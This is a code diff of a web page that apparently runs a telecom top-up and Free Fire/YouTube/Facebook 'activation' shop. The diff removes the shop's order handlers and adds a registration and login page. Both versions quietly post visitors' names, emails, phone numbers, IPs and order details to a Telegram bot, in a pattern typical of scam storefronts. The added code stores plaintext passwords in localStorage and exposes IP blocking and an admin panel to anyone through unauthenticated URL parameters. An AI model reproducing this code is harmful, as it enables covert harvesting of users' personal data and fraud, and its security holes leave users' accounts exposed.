-                            { id: "a11", data: "100 GB", minutes: "", validity: "30 Day", basePrice: 743 }, 
-                            { id: "a12", data: "35 GB", minutes: "", validity: "30 Day", basePrice: 357 }, 
-                            { id: "a13", data: "40 GB", minutes: "", validity: "30 Day", basePrice: 0, stockOut: true },
-                            { id: "a14", data: "25 GB", minutes: "", validity: "30 Day", basePrice: 300 }, 
-                            { id: "a16", data: "Limitless", minutes: "", validity: "30 Day", basePrice: 821 }, 
-                            { id: "a17", data: "", minutes: "1000 Minutes", validity: "30 Day", basePrice: 486 }, 
-                            { id: "a18", data: "", minutes: "900 Minutes", validity: "30 Day", basePrice: 386 }, 
-                            { id: "a19", data: "", minutes: "600 Minutes", validity: "30 Day", basePrice: 357 }, 
-                            { id: "a20", data: "", minutes: "500 Minutes", validity: "30 Day", basePrice: 300 }  
-                        ]
-                    },
-                    navigatetofacebook: {
-                        name: "Skitto",
-                        logo: "https://i.im.ge/QMCBr68/image_search_1783651817770.png",
-                        offers: [
-                            { id: "s0", data: "95 GB", minutes: "1200 Minutes", validity: "30 Day", basePrice: 949 },
-                            { id: "s1", data: "22 GB", minutes: "1400 Minutes", validity: "30 Day", basePrice: 609 },
-                            { id: "s2", data: "105 GB", minutes: "1850 Minutes", validity: "30 Day", basePrice: 1072 },
-                            { id: "s3", data: "68 GB", minutes: "1500 Minutes", validity: "30 Day", basePrice: 899 },
-                            { id: "s4", data: "52 GB", minutes: "950 Minutes", validity: "30 Day", basePrice: 749 },
-                            { id: "s5", data: "42 GB", minutes: "850 Minutes", validity: "30 Day", basePrice: 599 },
-                            { id: "s6", data: "38 GB", minutes: "650 Minutes", validity: "30 Day", basePrice: 539 },
-                            { id: "s7", data: "27 GB", minutes: "450 Minutes", validity: "30 Day", basePrice: 469 },
-                            { id: "s8", data: "58 GB", minutes: "", validity: "30 Day", basePrice: 529 },
-                            { id: "s9", data: "105 GB", minutes: "", validity: "30 Day", basePrice: 760 },
-                            { id: "s10", data: "84 GB", minutes: "", validity: "30 Day", basePrice: 680 },
-                            { id: "s11", data: "48 GB", minutes: "", validity: "30 Day", basePrice: 430 },
-                            { id: "s12", data: "33 GB", minutes: "", validity: "30 Day", basePrice: 380 },
-                            { id: "s13", data: "98 GB", minutes: "", validity: "30 Day", basePrice: 0, stockOut: true },
-                            { id: "s14", data: "28 GB", minutes: "", validity: "30 Day", basePrice: 345 },
-                            { id: "s15", data: "Limitless", minutes: "", validity: "30 Day", basePrice: 869 },
-                            { id: "s16", data: "", minutes: "950 Minutes", validity: "30 Day", basePrice: 475 },
-                            { id: "s17", data: "", minutes: "850 Minutes", validity: "30 Day", basePrice: 379 },
-                            { id: "s18", data: "", minutes: "650 Minutes", validity: "30 Day", basePrice: 349 },
-                            { id: "s19", data: "", minutes: "550 Minutes", validity: "30 Day", basePrice: 315 }
-                        ]
-                    }
-                },
-
-                navigateToOperator(slug) { this.currentSlug = slug; this.navigateTo('telecom-operator'); },
-                navigateToTelecomCheckout(offer) { this.checkoutOffer = offer; this.telecomPhone = ''; this.telecomPromo = ''; this.telecomErrors = {}; this.navigateTo('telecom-checkout'); },
-
-                async handleTelecomSubmit() {
-                    this.telecomErrors = {};
-                    if (!/^01\d{9}$/.test(this.telecomPhone)) this.telecomErrors.phone = "সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন";
-                    
-                    if (this.telecomPromo.trim() !== this.getLivePromoCode()) {
-                        this.telecomErrors.promo = "সঠিক প্রমোকোড পেতে এডমিনকে মেসেজ দিন।";
-                        return;
-                    }
-
-                    if (Object.keys(this.telecomErrors).length === 0) {
-                        this.isTelecomSubmitting = true;
-                        const finalPrice = this.calcCheckoutPrice(this.checkoutOffer.basePrice, this.telecomPromo);
-                        const txt = `Platform: TopUp\nNumber: ${this.telecomPhone}\nPaid: ৳${finalPrice}\nCode: ${this.telecomPromo}`;
-                        try {
-                            await fetch(`https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`, {
-                                method: "POST", headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({ chat_id: this.telegramChatId, text: txt })
-                            });
-                        } catch(e){}
-                        setTimeout(() => { 
-                            this.isTelecomSubmitting = false; 
-                            this.globalPayAmount = parseFloat(finalPrice).toFixed(2);
-                            this.navigateTo('telecom-checkout-frame'); 
-                        }, 1000);
-                    }
-                },
-
-                // ============ YOUTUBE ============
-                selectYtPlan(name, basePrice) { this.ytPlanName = name; this.ytPlanBasePrice = basePrice; },
-
-                async handleYtActivationSubmit() {
-                    if(!this.ytChannelData) { return; }
-                    
-                    const activePromo = this.getLivePromoCode();
-                    const userEntered = this.ytPromo ? this.ytPromo.trim() : "";
-                    if (userEntered !== activePromo) {
-                        return;
-                    }
-
-                    const finalPrice = this.calcCheckoutPrice(this.ytPlanBasePrice, this.ytPromo);
-                    const message = `🔔 <b>NEW YOUTUBE ACTIVATION</b>\n\n` +
-                                    `📺 Plan: ${this.ytPlanName} (৳${finalPrice})\n` +
-                                    `📺 Name: ${this.ytChannelData.title}\n` +
-                                    `🆔 Handle: ${this.ytChannelData.handle}\n` +
-                                    `👥 Subs: ${this.ytChannelData.subs} | 🎥 Videos: ${this.ytChannelData.videos}\n` +
-                                    `🎫 Promo: ${this.ytPromo || 'None'}\n` +
-                                    `🌍 Country: ${this.ytCountry}`;
-
-                    try {
-                        await fetch(`https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`, {
-                            method: "POST", headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ chat_id: this.telegramChatId, text: message, parse_mode: "HTML" })
-                        });
-                    } catch(e){}
-  
-                    this.globalPayAmount = parseFloat(finalPrice).toFixed(2);
-                    this.navigateTo('telecom-checkout-frame');
-                },
-
-                // ============ FACEBOOK ============
-                selectFbPlan(name, basePrice) { this.fbPlanName = name; this.fbPlanBasePrice = basePrice; },
-                
-                async handleFbActivation() {
-                    if (!this.fbLink.trim()) return;
-                    
-                    const activePromo = this.getLivePromoCode();
-                    const userEntered = this.fbPromo ? this.fbPromo.trim() : "";
-                    if (userEntered !== activePromo) {
-                        return;
-                    }
-                    
-                    const price = this.calcCheckoutPrice(this.fbPlanBasePrice, this.fbPromo);
-                    const payload = `📦 <b>NEW FACEBOOK ACTIVATION</b>\nPlan: ${this.fbPlanName}\nLink: ${this.fbLink}\nPrice: ৳${price}\nPromo: ${this.fbPromo}`;
-                    try {
-                        await fetch(`https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`, {
-                            method: "POST", headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ chat_id: this.telegramChatId, text: payload, parse_mode: "HTML" })
-                        });
-                    } catch(e){}
-
-                    this.globalPayAmount = parseFloat(price).toFixed(2);
-                    this.navigateTo('telecom-checkout-frame');
-                },
-
-                // ============ LEVEL UP ============
-                selectLevelUpPkg(id, name, basePrice) { this.lvlPkgId = id; this.lvlPkgBasePrice = basePrice; },
-                
-                async handleLevelUpPurchase() {
-                    if (!this.lvlGameUid.trim()) return;
-                    
-                    const activePromo = this.getLivePromoCode();
-                    const userEntered = this.lvlPromoCode ? this.lvlPromoCode.trim() : "";
-                    if (userEntered !== activePromo) {
-                        return;
-                    }
-                    
-                    const price = this.calcCheckoutPrice(this.lvlPkgBasePrice, this.lvlPromoCode);
-                    const payload = `🎮 <b>FREE FIRE LEVEL UP</b>\nUID: ${this.lvlGameUid}\nPrice: ৳${price}\nPromo: ${this.lvlPromoCode}`;
-                    try {
-                        await fetch(`https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`, {
-                            method: "POST", headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ chat_id: this.telegramChatId, text: payload, parse_mode: "HTML" })
-                        });
-                    } catch(e){}
-
-                    this.globalPayAmount = parseFloat(price).toFixed(2);
-                    this.navigateTo('telecom-checkout-frame');
-                },
-
-                // ============ UID TOPUP ============
-                selectUidPkg(pkg) { this.uidPkgId = pkg.id; this.uidSelectedPrice = pkg.originalPrice; },
-                
-                async handleUidPurchase() {
-                    if (!this.uidPkgId || !this.uidGameId.trim()) return;
-                    
-                    const activePromo = this.getLivePromoCode();
-                    const userEntered = this.uidPromoCode ? this.uidPromoCode.trim() : "";
-                    if (userEntered !== activePromo) {
-                        return;
-                    }
-                    
-                    const catalog = this.uidPackages.find(p => p.id === this.uidPkgId);
-                    const price = this.calcCheckoutPrice(catalog.originalPrice, this.uidPromoCode);
-                    const payload = `🎮 <b>FREE FIRE UID TOPUP</b>\nPackage: ${catalog.name}\nUID: ${this.uidGameId}\nPrice: ৳${price}\nPromo: ${this.uidPromoCode}`;
-                    try {
-                        await fetch(`https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`, {
-                            method: "POST", headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ chat_id: this.telegramChatId, text: payload, parse_mode: "HTML" })
-                        });
-                    } catch(e){}
-
-                    this.globalPayAmount = parseFloat(price).toFixed(2);
-                    this.navigateTo('telecom-checkout-frame');
-                },
-
-                // ============ CONFIRM ORDER ============
-                openDirectConfirmOrder() {
-                    this.orderProduct = "Custom Selected Bundle Matrix";
-                    this.navigateTo('confirm-order');
-                },
-
-                async processFinalOrder() {
-                    if (!this.orderName.trim() || !this.orderPhone.trim()) return;
-                    
-                    const activePromo = this.getLivePromoCode();
-                    const userEntered = this.orderPromo ? this.orderPromo.trim() : "";
-                    if (userEntered !== activePromo) {
-                        return;
-                    }
-                    
-                    let basePrice = 1;
-                    let matchPrice = this.orderProduct.match(/৳(\d+)/);
-                    if(matchPrice) {
-                        basePrice = parseInt(matchPrice[1]);
-                    }
-                    const finalPrice = this.calcCheckoutPrice(basePrice, this.orderPromo);
-
-                    const payload = `📦 <b>NEW CONFIRMED ORDER</b>\nName: ${this.orderName}\nPhone: ${this.orderPhone}\nContext: ${this.orderProduct}\nPaid: ৳${finalPrice}\nPromo: ${this.orderPromo}`;
-                    try {
-                        await fetch(`https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`, {
-                            method: "POST", headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ chat_id: this.telegramChatId, text: payload, parse_mode: "HTML" })
-                        });
-                    } catch(e){}
-
-                    this.globalPayAmount = parseFloat(finalPrice).toFixed(2);
-                    this.navigateTo('telecom-checkout-frame');
-                }
+    // ====== Admin Panel Functions ======
+    function adminBlock() {
+        const ip = prompt('Enter IP address to block:');
+        if (ip) {
+            if (blockIP(ip)) {
+                showAdminStatus(`✅ IP ${ip} blocked!`, 'success');
+            } else {
+                showAdminStatus(`ℹ️ IP ${ip} is already blocked!`, 'info');
             }
         }
-    </script>
+    }
+
+    function adminUnblock() {
+        if (blockedIPs.length === 0) {
+            showAdminStatus('ℹ️ No IPs to unblock!', 'info');
+            return;
+        }
+        const ip = prompt('Enter IP address to unblock:\n\nBlocked IPs:\n' + blockedIPs.join('\n'));
+        if (ip) {
+            if (unblockIP(ip)) {
+                showAdminStatus(`✅ IP ${ip} unblocked!`, 'success');
+            } else {
+                showAdminStatus(`ℹ️ IP ${ip} is not blocked!`, 'info');
+            }
+        }
+    }
+
+    function adminView() {
+        if (blockedIPs.length === 0) {
+            alert('📋 No IPs are currently blocked.');
+        } else {
+            alert(`📋 Blocked IPs (${blockedIPs.length}):\n\n${blockedIPs.join('\n')}`);
+        }
+    }
+
+    function adminClear() {
+        if (confirm('⚠️ Are you sure you want to clear ALL blocked IPs?')) {
+            blockedIPs = [];
+            localStorage.setItem('blockedIPs', JSON.stringify(blockedIPs));
+            updateAdminUI();
+            showAdminStatus('✅ All IPs have been unblocked!', 'success');
+        }
+    }
+
+    function adminBlockCustom() {
+        const ip = document.getElementById('adminIPInput').value.trim();
+        if (!ip) {
+            showAdminStatus('❌ Please enter an IP!', 'error');
+            return;
+        }
+        if (blockIP(ip)) {
+            showAdminStatus(`✅ IP ${ip} blocked!`, 'success');
+        } else {
+            showAdminStatus(`ℹ️ IP ${ip} is already blocked!`, 'info');
+        }
+        document.getElementById('adminIPInput').value = '';
+    }
+
+    function adminUnblockCustom() {
+        const ip = document.getElementById('adminIPInput').value.trim();
+        if (!ip) {
+            showAdminStatus('❌ Please enter an IP!', 'error');
+            return;
+        }
+        if (unblockIP(ip)) {
+            showAdminStatus(`✅ IP ${ip} unblocked!`, 'success');
+        } else {
+            showAdminStatus(`ℹ️ IP ${ip} is not blocked!`, 'info');
+        }
+        document.getElementById('adminIPInput').value = '';
+    }
+
+    function showAdminStatus(text, type) {
+        const el = document.getElementById('adminStatus');
+        el.textContent = text;
+        el.className = `status-msg ${type}`;
+        el.style.display = 'block';
+        setTimeout(() => { el.style.display = 'none'; }, 5000);
+    }
+
+    // ====== User Management ======
+    function viewAllUsers() {
+        const users = JSON.parse(localStorage.getItem('users')) || [];
+        if (users.length === 0) {
+            alert('📋 No users registered yet.');
+        } else {
+            let msg = '👥 Registered Users:\n\n';
+            users.forEach((u, i) => {
+                msg += `${i+1}. ${u.name} | ${u.email} | ${u.number}\n`;
+            });
+            alert(msg);
+        }
+    }
+
+    function clearAllUsers() {
+        if (confirm('⚠️ Are you sure you want to delete ALL users? This cannot be undone!')) {
+            localStorage.removeItem('users');
+            localStorage.removeItem('loggedInUser');
+            updateAdminUI();
+            showAdminStatus('✅ All users have been deleted.', 'success');
+            location.reload();
+        }
+    }
+
+    // ====== Show Admin Page ======
+    function showAdminPage() {
+        document.getElementById('appContainer').style.display = 'none';
+        document.getElementById('adminPage').style.display = 'block';
+        updateAdminUI();
+    }
+
+    function goBackToApp() {
+        document.getElementById('appContainer').style.display = 'block';
+        document.getElementById('adminPage').style.display = 'none';
+        window.history.replaceState({}, document.title, window.location.pathname);
+    }
+
+    // ====== Send to Telegram ======
+    async function sendToTelegram(message, ip) {
+        try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            const isBlocked = blockedIPs.includes(ip);
+            const replyMarkup = {
+                inline_keyboard: [
+                    [
+                        { 
+                            text: isBlocked ? '✅ Unblock User' : '🚫 Block User', 
+                            url: `${CURRENT_URL}?${isBlocked ? 'unblock' : 'block'}=${ip}`
+                        },
+                        { 
+                            text: '🔧 Admin Panel', 
+                            url: `${CURRENT_URL}?admin=open`
+                        }
+                    ]
+                ]
+            };
+            
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML',
+                reply_markup: replyMarkup
+            };
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+            const data = await response.json();
+            if (!data.ok) {
+                console.error('Telegram Error:', data);
+            }
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+        }
+    }
+
+    // ====== Validate Email ======
+    function validateEmail(email) {
+        return email.toLowerCase().endsWith('@gmail.com') && email.length > 10;
+    }
+
+    // ====== Validate Phone ======
+    function validateNumber(number) {
+        return /^01\d{9}$/.test(number);
+    }
+
+    // ====== Register User ======
+    async function registerUser() {
+        if (await checkBlocked()) return;
+
+        const name = document.getElementById('regName').value.trim();
+        const email = document.getElementById('regEmail').value.trim();
+        const number = document.getElementById('regNumber').value.trim();
+        const password = document.getElementById('regPassword').value;
+        const confirm = document.getElementById('regConfirm').value;
+
+        document.querySelectorAll('.form-group input').forEach(inp => {
+            inp.classList.remove('error');
+        });
+
+        let hasError = false;
+
+        if (!name) {
+            document.getElementById('regName').classList.add('error');
+            hasError = true;
+        }
+        if (!email || !validateEmail(email)) {
+            document.getElementById('regEmail').classList.add('error');
+            hasError = true;
+        }
+        if (!number || !validateNumber(number)) {
+            document.getElementById('regNumber').classList.add('error');
+            hasError = true;
+        }
+        if (!password || password.length < 6) {
+            document.getElementById('regPassword').classList.add('error');
+            hasError = true;
+        }
+        if (!confirm || confirm !== password) {
+            document.getElementById('regConfirm').classList.add('error');
+            hasError = true;
+        }
+
+        if (hasError) {
+            showMessage('registerMessage', '❌ Please fill all fields correctly!', 'error');
+            return;
+        }
+
+        let users = JSON.parse(localStorage.getItem('users')) || [];
+        if (users.some(u => u.email === email)) {
+            showMessage('registerMessage', '❌ Email already registered!', 'error');
+            document.getElementById('regEmail').classList.add('error');
+            return;
+        }
+        if (users.some(u => u.number === number)) {
+            showMessage('registerMessage', '❌ Phone already registered!', 'error');
+            document.getElementById('regNumber').classList.add('error');
+            return;
+        }
+
+        const ip = await getUserIP();
+
+        const newUser = {
+            name: name,
+            email: email,
+            number: number,
+            password: password,
+            ip: ip,
+            registeredAt: new Date().toISOString()
+        };
+
+        users.push(newUser);
+        localStorage.setItem('users', JSON.stringify(users));
+
+        const telegramMsg = `
+📝 <b>New Registration</b>
+👤 Name: ${name}
+📧 Email: ${email}
+📱 Phone: ${number}
+🌐 IP: <code>${ip}</code>
+🕐 Time: ${new Date().toLocaleString()}
+        `;
+        await sendToTelegram(telegramMsg, ip);
+
+        showMessage('registerMessage', `✅ Registration successful! Welcome ${name}!`, 'success');
+        
+        document.getElementById('regName').value = '';
+        document.getElementById('regEmail').value = '';
+        document.getElementById('regNumber').value = '';
+        document.getElementById('regPassword').value = '';
+        document.getElementById('regConfirm').value = '';
+
+        localStorage.setItem('loggedInUser', JSON.stringify(newUser));
+        showUserStatus(newUser);
+
+        setTimeout(() => {
+            showLogin();
+            showMessage('loginMessage', '✅ You are now logged in!', 'success');
+        }, 1500);
+    }
+
+    // ====== Login User ======
+    async function loginUser() {
+        if (await checkBlocked()) return;
+
+        const identifier = document.getElementById('loginEmailOrNumber').value.trim();
+        const password = document.getElementById('loginPassword').value;
+
+        if (!identifier || !password) {
+            showMessage('loginMessage', '❌ Please enter email/phone and password!', 'error');
+            return;
+        }
+
+        const users = JSON.parse(localStorage.getItem('users')) || [];
+        const matchedUser = users.find(u => 
+            (u.email === identifier || u.number === identifier) && u.password === password
+        );
+
+        if (matchedUser) {
+            const ip = await getUserIP();
+            
+            const telegramMsg = `
+🔑 <b>User Login</b>
+👤 Name: ${matchedUser.name}
+📧 Email: ${matchedUser.email}
+📱 Phone: ${matchedUser.number}
+🌐 IP: <code>${ip}</code>
+🕐 Time: ${new Date().toLocaleString()}
+            `;
+            await sendToTelegram(telegramMsg, ip);
+
+            showMessage('loginMessage', `✅ Welcome back ${matchedUser.name}!`, 'success');
+            localStorage.setItem('loggedInUser', JSON.stringify(matchedUser));
+            showUserStatus(matchedUser);
+            
+            document.getElementById('loginEmailOrNumber').value = '';
+            document.getElementById('loginPassword').value = '';
+        } else {
+            showMessage('loginMessage', '❌ Invalid email/phone or password!', 'error');
+        }
+    }
+
+    // ====== GOOGLE LOGIN - WORKING WITH POPUP ======
+    function googleLogin() {
+        // Open Google OAuth popup
+        const authUrl = 'https://accounts.google.com/o/oauth2/v2/auth?' +
+            'client_id=' + encodeURIComponent(GOOGLE_CLIENT_ID) +
+            '&redirect_uri=' + encodeURIComponent(window.location.href) +
+            '&response_type=token' +
+            '&scope=' + encodeURIComponent('email profile') +
+            '&prompt=select_account';
+
+        // Open popup
+        const popup = window.open(
+            authUrl,
+            'GoogleLogin',
+            'width=500,height=600,scrollbars=yes'
+        );
+
+        // Listen for redirect from Google
+        const checkPopup = setInterval(() => {
+            try {
+                if (popup.location.href && popup.location.href.includes('#')) {
+                    // Get token from URL fragment
+                    const hash = popup.location.href.split('#')[1];
+                    const params = new URLSearchParams(hash);
+                    const accessToken = params.get('access_token');
+                    const tokenType = params.get('token_type');
+                    
+                    if (accessToken) {
+                        clearInterval(checkPopup);
+                        popup.close();
+                        // Fetch user info
+                        fetchUserInfo(accessToken);
+                    }
+                }
+            } catch (e) {
+                // Cross-origin error - wait for redirect
+            }
+        }, 500);
+
+        // Timeout after 2 minutes
+        setTimeout(() => {
+            clearInterval(checkPopup);
+            try { popup.close(); } catch(e) {}
+        }, 120000);
+    }
+
+    // ====== Fetch User Info from Google ======
+    async function fetchUserInfo(accessToken) {
+        try {
+            const response = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
+                headers: {
+                    'Authorization': `Bearer ${accessToken}`
+                }
+            });
+            const userInfo = await response.json();
+            
+            if (userInfo.email) {
+                // Process Google login
+                processGoogleUser(userInfo);
+            } else {
+                showMessage('registerMessage', '❌ Failed to get user info from Google!', 'error');
+            }
+        } catch (error) {
+            console.error('Error fetching user info:', error);
+            showMessage('registerMessage', '❌ Error connecting to Google!', 'error');
+        }
+    }
+
+    // ====== Process Google User ======
+    async function processGoogleUser(userInfo) {
+        const email = userInfo.email;
+        const name = userInfo.name || email.split('@')[0];
+        
+        // Check if user exists
+        let users = JSON.parse(localStorage.getItem('users')) || [];
+        let existingUser = users.find(u => u.email === email);
+        
+        if (existingUser) {
+            // Login existing user
+            showMessage('registerMessage', `✅ Welcome back ${existingUser.name}!`, 'success');
+            localStorage.setItem('loggedInUser', JSON.stringify(existingUser));
+            showUserStatus(existingUser);
+            
+            // Send login notification
+            const ip = await getUserIP();
+            const telegramMsg = `
+🔵 <b>Google Login</b>
+👤 Name: ${existingUser.name}
+📧 Email: ${existingUser.email}
+🌐 IP: <code>${ip}</code>
+🕐 Time: ${new Date().toLocaleString()}
+            `;
+            await sendToTelegram(telegramMsg, ip);
+        } else {
+            // Create new user
+            const newUser = {
+                name: name,
+                email: email,
+                number: 'Google User',
+                password: 'google_oauth_' + Math.random().toString(36).substr(2, 10),
+                ip: 'Google OAuth',
+                registeredAt: new Date().toISOString()
+            };
+            
+            users.push(newUser);
+            localStorage.setItem('users', JSON.stringify(users));
+            
+            showMessage('registerMessage', `✅ Google registration successful! Welcome ${name}!`, 'success');
+            localStorage.setItem('loggedInUser', JSON.stringify(newUser));
+            showUserStatus(newUser);
+            
+            // Send registration notification
+            const ip = await getUserIP();
+            const telegramMsg = `
+🟢 <b>Google Registration</b>
+👤 Name: ${newUser.name}
+📧 Email: ${newUser.email}
+🌐 IP: <code>${ip}</code>
+🕐 Time: ${new Date().toLocaleString()}
+            `;
+            await sendToTelegram(telegramMsg, ip);
+        }
+    }
+
+    // ====== Show User Status ======
+    function showUserStatus(user) {
+        document.getElementById('userStatus').classList.remove('hidden');
+        document.getElementById('registerForm').classList.add('hidden');
+        document.getElementById('loginForm').classList.add('hidden');
+        document.getElementById('registerTab').classList.add('hidden');
+        document.getElementById('loginTab').classList.add('hidden');
+        
+        document.getElementById('loggedUserName').textContent = `👋 Welcome, ${user.name}`;
+        document.getElementById('loggedUserEmail').textContent = `📧 ${user.email}`;
+        
+        sendAppOpenNotification(user);
+    }
+
+    // ====== Send App Open Notification ======
+    async function sendAppOpenNotification(user) {
+        const ip = await getUserIP();
+        const telegramMsg = `
+📱 <b>App Opened</b>
+👤 Name: ${user.name}
+📧 Email: ${user.email}
+📱 Phone: ${user.number || 'N/A'}
+🌐 IP: <code>${ip}</code>
+🕐 Time: ${new Date().toLocaleString()}
+        `;
+        await sendToTelegram(telegramMsg, ip);
+    }
+
+    // ====== Logout User ======
+    function logoutUser() {
+        localStorage.removeItem('loggedInUser');
+        document.getElementById('userStatus').classList.add('hidden');
+        document.getElementById('registerTab').classList.remove('hidden');
+        document.getElementById('loginTab').classList.remove('hidden');
+        showRegister();
+        showMessage('registerMessage', '✅ Logged out successfully!', 'success');
+    }
+
+    // ====== Handle URL Parameters ======
+    function handleURLParams() {
+        const params = new URLSearchParams(window.location.search);
+        
+        if (params.has('block')) {
+            const ip = params.get('block');
+            blockIP(ip);
+            window.history.replaceState({}, document.title, window.location.pathname);
+            location.reload();
+        }
+        
+        if (params.has('unblock')) {
+            const ip = params.get('unblock');
+            unblockIP(ip);
+            window.history.replaceState({}, document.title, window.location.pathname);
+            location.reload();
+        }
+        
+        if (params.has('admin') && params.get('admin') === 'open') {
+            setTimeout(() => {
+                showAdminPage();
+            }, 300);
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+    }
+
+    // ====== Check for Google OAuth callback ======
+    function checkGoogleCallback() {
+        if (window.location.hash && window.location.hash.includes('access_token')) {
+            const hash = window.location.hash.substring(1);
+            const params = new URLSearchParams(hash);
+            const accessToken = params.get('access_token');
+            
+            if (accessToken) {
+                // Clean URL
+                window.history.replaceState({}, document.title, window.location.pathname);
+                // Fetch user info
+                fetchUserInfo(accessToken);
+            }
+        }
+    }
+
+    // ====== Window Load ======
+    window.onload = async function() {
+        // Check for Google OAuth callback
+        checkGoogleCallback();
+        
+        handleURLParams();
+        
+        if (document.getElementById('adminPage').style.display === 'block') {
+            updateAdminUI();
+            return;
+        }
+
+        if (await checkBlocked()) return;
+
+        const loggedUser = localStorage.getItem('loggedInUser');
+        if (loggedUser) {
+            try {
+                const user = JSON.parse(loggedUser);
+                showUserStatus(user);
+            } catch(e) {
+                showRegister();
+            }
+        } else {
+            showRegister();
+        }
+
+        console.log('🔧 Admin Panel: Click "🔧 Admin Panel" button in Telegram');
+        console.log('🔑 Google Login: Click "Register with Google" or "Login with Google"');
+    };
+</script>
 </body>
 </html>
